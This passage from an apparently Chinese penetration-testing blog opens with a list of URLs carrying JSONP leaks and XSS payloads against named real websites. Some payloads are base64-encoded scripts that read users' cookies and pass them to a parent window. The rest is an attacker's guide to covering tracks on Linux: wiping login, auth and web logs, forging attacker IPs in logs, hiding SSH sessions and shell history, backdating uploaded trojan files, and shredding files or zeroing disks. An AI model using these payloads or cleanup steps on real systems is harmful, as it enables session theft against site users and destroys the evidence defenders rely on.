class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.4515320024420155</span><br><span class="line"></span><br><span class="line">https://bbs.zhibo8.cc/user/userinfo?device=pc&amp;_=1584613345023&amp;callback=jcbDNoDtQbW&amp;callback=callback_165893378313192912</span><br><span class="line"></span><br><span class="line">https://myjr.suning.com/sfp/mutualTrust/getLoginInfo.htm?callback=getphone</span><br><span class="line"></span><br><span class="line">https://myjr.suning.com/sfp/headPic/getEgoMemberHeadPicUrl.htm</span><br><span class="line"></span><br><span class="line">https://ajax.58pic.com/58pic/index.php?m=adManageSystem&amp;a=showAdDeliveryForPosition&amp;callback=%3Cscript%3Eeval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoicWlhbnR1IiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgicXRfdWlkIil9fSwnKicpOw==%27))%3C/script%3E&amp;position=31&amp;keyword=XXX&amp;_=1590829943379</span><br><span class="line"></span><br><span class="line">https://my.zol.com.cn/public_new.php</span><br><span class="line"></span><br><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.04630644674906281</span><br><span class="line"></span><br><span class="line">https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.38244545320223655</span><br><span class="line"></span><br><span class="line">http://my.zol.com.cn/public_new.php</span><br><span class="line"></span><br><span class="line">https://loginst.suning.com/authStatus?callback=getuid</span><br><span class="line"></span><br><span class="line">https://www.fhyx.com/account/login.html?redirecturl=%22%3E%3CSCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/SCrIpT%3E</span><br><span class="line"></span><br><span class="line">https://so.u17.com/all/%22%3C/span%3E%250a%3Cimg%2520src=1%20onerror=%22document.body.innerHTML=location.search;document.body.innerHTML=document.body.innerText;%22%3E%250a%22/m0_p1.html?&amp;lt;img/src=&amp;quot;x&amp;quot;/onerror=a=eval;a(atob(unescape(location.hash.slice(1))))&amp;gt;</span><br><span class="line"></span><br><span class="line">https://i.vip.iqiyi.com/client/store/pc/checkout.action?platform=b6c13e26323c537d&amp;fs=&amp;fsSign=&amp;fc=&amp;fv=&amp;qc005=&amp;P00001=&amp;pid=adb3376b039b970b&amp;vipType=2&amp;aid=&amp;device_id=&amp;callback=callback_165893378307001282</span><br><span class="line"></span><br><span class="line">https://login.sina.com.cn/sso/login.php?client=&amp;service=&amp;client=&amp;encoding=&amp;gateway=1&amp;returntype=TEXT&amp;useticket=0&amp;callback=sina2&amp;_=1577938268947&amp;callback=callback_165893378307919803</span><br><span class="line"></span><br><span class="line">https://v-api-plus.huya.com/jsapi/getUserInfo?callback=jQuery1111007865243652615272_1628490347897&amp;_=1628490347898&amp;callback=callback_165893378306693233</span><br><span class="line"></span><br><span class="line">http://mapp.jrj.com.cn/pc/content/getMqNews?vname=%3Csvg%20onload=eval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoianJqIiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgibXlqcmpfdXNlcmlkIil9fSwnKicpOw==%27))%3E</span><br><span class="line"></span><br><span class="line">https://www.ixueshu.com/index.html?v=1608893853571&amp;template=sys_login_ajax.html&amp;_url=123123123%22%22%3E%3CsCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/sCrIpT%3E</span><br><span class="line"></span><br><span class="line">https://hackit.me/v.qq.com/</span><br><span class="line"></span><br><span class="line">https://api.csdn.net/oauth/authorize?client_id=1000001&amp;redirect_uri=http://www.iteye.com/auth/csdn/callback&amp;response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E</span><br></pre></td></tr></table></figure><hr><h3 id="Linux痕迹清理"><a href="#Linux痕迹清理" class="headerlink" title="Linux痕迹清理"></a>Linux痕迹清理</h3><p>​     <strong>#管理员   $普通用户   /表示根目录   ~表示当前用户家目录</strong></p><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><table><thead><tr><th>命令</th><th>日志文件</th><th>功能</th></tr></thead><tbody><tr><td>w,who</td><td>/var/run/utmp</td><td>记录当前正在登录系统的用户信息，uptime记录系统启动时间</td></tr><tr><td>last</td><td>/var/log/wtmp</td><td>所有成功登录/登出的历史记录</td></tr><tr><td>lastb</td><td>/var/log/btmp</td><td>登录失败尝试</td></tr><tr><td>lastlog</td><td>/var/log/lastlog</td><td>最近登录记录</td></tr></tbody></table><p>​    这些日志都是以二进制形式存储。</p><table><thead><tr><th><strong>日志</strong></th><th>作用</th></tr></thead><tbody><tr><td>/var/log/secure</td><td>记录与安全相关的日志信息，涉及使用账户和密码登录的程序都会记录</td></tr><tr><td>/var/log/auth.log</td><td>需要身份确认的操作</td></tr><tr><td>/var/log/messages</td><td>记录系统启动后的信息和错误日志</td></tr><tr><td>/var/log/cron</td><td>记录定时任务相关的日志信息</td></tr><tr><td>/var/log/spooler</td><td>记录UUCP和news设备相关的日志信息</td></tr><tr><td>/var/log/boot.log</td><td>记录守护进程启动和停止相关的日志消息</td></tr></tbody></table><h5 id="清除方法"><a href="#清除方法" class="headerlink" title="清除方法"></a>清除方法</h5><h6 id="方案一直接清空："><a href="#方案一直接清空：" class="headerlink" title="方案一直接清空："></a>方案一直接清空：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; /var/log/utmp</span><br><span class="line">&gt; /var/log/wtmp</span><br><span class="line">&gt; /var/log/btmp</span><br><span class="line">&gt; /var/log/lastlog</span><br></pre></td></tr></table></figure><p>​    不留下任何痕迹，但是特征也很明显，容易被察觉，一般不推荐使用。将日志文件全部删除即将空字符写入日志文件，需要root权限，有五种命令可以实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br></pre></td></tr></table></figure><p>​    区别：前三种命令清空文件后文件大小为0，后两种命令清空文件后会留下一个换行符，文件大小为1byte。</p><h6 id="方案二部分删除："><a href="#方案二部分删除：" class="headerlink" title="方案二部分删除："></a>方案二部分删除：</h6><p>​    对于文本格式的日志文件，可以直接进入文件进行删改，也可以利用流编辑命令<code>sed</code>删除文件中匹配的行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除所有匹配到字符串的行，比如自己的登录ip</span></span><br><span class="line">sed -i <span class="string">&#x27;/ip/d&#x27;</span> /var/log/messages</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局替换登录IP地址：</span></span><br><span class="line">sed -i <span class="string">&#x27;s/ip1/ip2/g&#x27;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure><p>​    对于二进制日志文件，部分删除需要使用<code>utmpdump</code>命令，<code>utmpdump</code>可以将wtmp和utmp转换为文本文件，将文本文件编辑修改后恢复成二进制文件即可，如下面针对wtmp进行修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将二进制日志文件转换为可编辑的文本文件</span></span><br><span class="line">utmpdump /var/log/wtmp &gt;/var/log/wtmp.file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对文本文件进行编辑和修改</span></span><br><span class="line"><span class="comment"># 将编辑修改后的文本文件转换为二进制日志文件</span></span><br><span class="line">utmpdump -r &lt; /var/log/wtmp.file &gt; /var/log/wtmp</span><br></pre></td></tr></table></figure><h6 id="方案三隐藏登陆："><a href="#方案三隐藏登陆：" class="headerlink" title="方案三隐藏登陆："></a>方案三隐藏登陆：</h6><p>​    从应用层面通过参数选择隐藏记录，如ssh远程隐藏登录：</p><p>​    登录时不分配伪终端，不会记录在utmp、wtmp、btmp中，不会被w、who、users、last、lastb命令发现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@192.168.126.1 /bin/bash -i</span><br><span class="line"><span class="comment"># -T：不分配伪终端</span></span><br><span class="line"><span class="comment"># -i：bash的参数，表示交互式shell</span></span><br></pre></td></tr></table></figure><p>​    登录时不将ssh公钥保存在本地<code>.ssh</code>目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.126.2 /bin/bash –i</span><br><span class="line"><span class="comment"># -o：options选择信息</span></span><br></pre></td></tr></table></figure><p><strong>注：使用<code>ps</code>命令可以查看到ssh隐藏登录的进程</strong></p><h4 id="History记录"><a href="#History记录" class="headerlink" title="History记录"></a>History记录</h4><p>​    查看历史操作命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure><p>​    history显示<strong>内存和~/.bash_history中的所有内容</strong>；</p><p>​    内存中的内容并没有立刻写入~/.bash_history，只有当当前shell关闭时才会将内存内容写入shell。</p><h5 id="清除history历史命令记录"><a href="#清除history历史命令记录" class="headerlink" title="清除history历史命令记录"></a><strong>清除history历史命令记录</strong></h5><p>​    1、编辑history记录文件，删除部分不想被保存的历史命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_history</span><br></pre></td></tr></table></figure><p>​    2、清除当前用户的history命令记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c  <span class="comment"># 删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">history</span> -r  <span class="comment"># 删除当前会话历史记录</span></span><br></pre></td></tr></table></figure><p>​    3、利用vim特性删除历史命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment">#使用vim打开一个文件vi test.txt# 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。:set history=0# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令：vsp ~/.bash_history# 清楚保存.bash_history文件即可。</span></span><br></pre></td></tr></table></figure><p>​    4、在vim中执行自己不想让别人看到的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="built_in">history</span>=0</span><br><span class="line">:!<span class="built_in">command</span></span><br></pre></td></tr></table></figure><p>​    特别的可以运行**:!bash<strong>来启动一个bash shell并执行命令，不需要退出vim（最后还要删除VIM所产生的日志文件噢，kali里面是</strong>.viminfo<strong>，在vim中使用</strong>rm -rf**强制清除）。</p><h5 id="不记录history历史命令"><a href="#不记录history历史命令" class="headerlink" title="不记录history历史命令"></a>不记录history历史命令</h5><p>​    1、通过修改配置文件/etc/profile，使系统不再保存命令记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HISTSIZE=0</span><br></pre></td></tr></table></figure><p>​    2、登录后执行下面命令,不记录历史命令(.bash_history)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;</span><br><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null;</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=0;</span><br><span class="line"><span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure><h4 id="一键清除history和系统日志脚本"><a href="#一键清除history和系统日志脚本" class="headerlink" title="一键清除history和系统日志脚本"></a>一键清除history和系统日志脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure><h4 id="清除web日志痕迹"><a href="#清除web日志痕迹" class="headerlink" title="清除web日志痕迹"></a>清除web日志痕迹</h4><p>​    web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/apache/access.log</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/apache/error_log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/mysql/mysql_error.log</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/log/mysql/mysql_slow.log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/192.168.1.4/g&#x27;</span> –i /var/log/apache/php_error.log</span><br></pre></td></tr></table></figure><p>​    清除部分相关日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用grep -v来把我们的相关信息删除</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"><span class="comment"># 把修改过的日志覆盖到原日志文件</span></span><br><span class="line"><span class="built_in">cat</span> tmp.log &gt; /var/log/nginx/access.log/</span><br></pre></td></tr></table></figure><hr><h3 id="Linux文件伪装"><a href="#Linux文件伪装" class="headerlink" title="Linux文件伪装"></a>Linux文件伪装</h3><h4 id="伪装与隐藏"><a href="#伪装与隐藏" class="headerlink" title="伪装与隐藏"></a>伪装与隐藏</h4><h5 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h5><p>​    Linux文件时间戳包括三种，用stat filename命令查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问时间(access time，atime)：文件内容最后一次被读取的时间，如用<span class="built_in">cat</span>、more命令查看文件</span><br><span class="line">修改时间(modify time，mtime)：文件内容最后一次被修改的时间，如用vim编辑器修改文件内容</span><br><span class="line">改变时间(change time，ctime)：文件属性被最后一次被修改的时间，inode节点信息被修改时间（大小、属组、属主、权限），如用<span class="built_in">chmod</span>、<span class="built_in">chown</span>命令修改文件属性，或修改文件内容</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074234.jpg"                      alt="image-20220825213233277"                ></p><p>​    <code>ls -l</code>命令查看的是文件最后一次被修改的时间mtime。</p><p>​    上传工具或木马文件后，要将其修改为和当前目录中文件相近的时间，利用<code>touch</code>命令进行修改atime和mtime（不能修改ctime），命令参数如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-m：等同于–time=mtime，修改mtime</span><br><span class="line">-a：等同于–time=atime，修改atime</span><br><span class="line">-t：时间戳修改为指定时间[[CC]YY]MMDDhhmm[.ss]，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-d：时间戳修改为指定字符串，如<span class="string">&quot;2020-12-12 12:12:12.00&quot;</span>，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-r file：等同于–reference=file，时间戳修改为与file相同</span><br></pre></td></tr></table></figure><p>​    注意：<code>-d</code>和<code>-t</code>参数都有指定时间戳的功能，但是<code>-t</code>参数只能精确到秒，使用<code>stat</code>查看文件很容易看出破绽，使用<code>-d</code>参数更加精确隐蔽。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074235.jpg"                      alt="image-20220825214343015"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将3.aspx的atime和mtime修改为&quot;2020-12-12 12:12:12&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -t 202012121212.12 3.aspx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将3.aspx的mtime修改为&quot;2020-12-12 12:12:12.8731390581&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -m -d <span class="string">&quot;2020-12-12 12:12:12.831390581&quot;</span> 3.aspx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先将3.aspx的atime和mtime时间戳备份，待修改3.aspx后，再将其时间戳恢复</span></span><br><span class="line"><span class="built_in">touch</span> temp -r 3.aspx</span><br><span class="line">vim 3.aspx</span><br><span class="line"><span class="built_in">touch</span> 3.aspx -r temp</span><br><span class="line"><span class="built_in">rm</span> temp </span><br></pre></td></tr></table></figure><h5 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h5><p>​    Linux中以<code>.</code>开头命名的文件或文件夹即为隐藏文件，因此要隐藏某个文件或文件夹直接将其名字前加一个<code>.</code>就可以了。</p><p>​    查看所有文件（包括隐藏文件）可以用<code>ls -a</code>命令，只查看隐藏文件可以用<code>ls -d .*</code>命令。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74236.jpg"                      alt="image-20220825215245935"                ></p><h5 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h5><pre><code>需要修改的文件属性除了时间戳，主要还包括所属用户/组、读写权限等，常见命令如下：</code></pre><p>​    1、chown：修改文件所属用户，chown [options] [user][:[group]] file</p><p>​    2、chgrp：修改文件所属组，chgrp [options] [group] file</p><p>​    3、chmod：修改文件读/写/执行权限，有两种命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> [options] mode[,mode] file，其中mode为[ugoa][-+=][rwx]，具体含义为：</span><br><span class="line">u/g/o/a：user文件的所属用户/group文件的所属组/others其他用户/all所有用户及用户组</span><br><span class="line">-/+/=：权限的去除/添加/设置</span><br><span class="line">r/w/x：读/写/执行</span><br><span class="line"><span class="built_in">chmod</span> [options] octal-mode file，rwx对应各自权重，分别为二进制100、010、001，即421</span><br><span class="line">比如以下这两句命令是等同的：<span class="built_in">chmod</span> u=rwx,g=rx,o=r test.txt、<span class="built_in">chmod</span> 754 test.txt</span><br></pre></td></tr></table></figure><p>​    以上三种命令options有一个共同的参数-R：递归改变该目录及其子目录中的文件。</p><h4 id="文件擦除"><a href="#文件擦除" class="headerlink" title="文件擦除"></a>文件擦除</h4><p>​    为避免数据被恢复，对于敏感文件和工具，不应使用常规的<code>rm</code>、<code>rmdir</code>删除命令，而应使用覆写删除命令进行删除：</p><h5 id="shred命令"><a href="#shred命令" class="headerlink" title="shred命令"></a>shred命令</h5><p>实现安全的从硬盘上擦除数据，命令格式为：shred [options] file，options具体参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-f, --force：必要时修改权限以使目标可写</span><br><span class="line">-n, --iterations=N：覆盖N次，不指定次数则默认3 次</span><br><span class="line">-s, --size=N：将文件内容粉碎为指定字节大小的碎片(可使用K、M 和G 作为单位)</span><br><span class="line">-u, --remove：覆盖后截断并删除文件</span><br><span class="line">-v, --verbose：显示详细信息</span><br><span class="line">-z, --zero：最后一次使用ascii的0x00进行覆盖以隐藏覆盖动作</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将test1覆写6次后再填0x00，最后将其删除</span></span><br><span class="line"><span class="built_in">shred</span> -zufvn 6 1.txt</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074237.jpg"                      alt="image-20220825220702622"                ></p><h5 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h5><p>​    dd命令通常用来备份、恢复、转换磁盘上的分区和文件，也可以实现安全擦除数据，命令格式为：<code>dd options</code>，options包括：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>=file：输入文件名，缺省为标准输入</span><br><span class="line">of=file：输出文件名，缺省为标准输出</span><br><span class="line">ibs=size：读入块大小为size bytes</span><br><span class="line">obs=size：写出块大小为size bytes</span><br><span class="line">bs=size：同时设置读写块的大小为size bytes</span><br><span class="line">count=N：仅拷贝N个块，每块的大小为size bytes</span><br></pre></td></tr></table></figure><p>​    size单位默认为byte，同时也可以使用K、M、G为单位。常使用方法如下：</p><p>​    全盘数据备份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda1 of=~/image</span><br></pre></td></tr></table></figure><p>​    备份磁盘开始的512个字节大小的MBR信息到指定文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda1 of=~/image bs=512 count=1 </span><br></pre></td></tr></table></figure><p>​    利用0填充销毁磁盘数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=/dev/hda1</span><br></pre></td></tr></table></figure><p>​    利用随机数填充销毁文件数据，文件大小为1K，覆写6次：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/urandom of=~/test bs=1k count=6 </span><br></pre></td></tr></table></figure><hr><h3 id="Windows入侵痕迹清理"><a href="#Windows入侵痕迹清理" class="headerlink" title="Windows入侵痕迹清理"></a>Windows入侵痕迹清理</h3><p>1</p><hr><h3 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h ip -P 3306 -u root -p</span><br></pre></td></tr></table></figure><p>​    收录一些判断数据库和表大小的方法，以及一些语句。</p><p>​    首先打开数据库的日志记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074238.jpg"                      alt="image-20220829140403933"                ></p><p>​    开启日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="string">&#x27;On&#x27;</span>;</span><br></pre></td></tr></table></figure><p>​    更换位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/lib/mysql/mysql.log&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074239.jpg"                      alt="image-20220829142319070"                ></p><p>​    我们查看日志可以看到连接ip信息等</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074243.jpg"                      alt="image-20220829143107311"                ></p><h4 id="查看数据库大小"><a href="#查看数据库大小" class="headerlink" title="查看数据库大小"></a>查看数据库大小</h4><p>​    查询所用数据库总大小</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 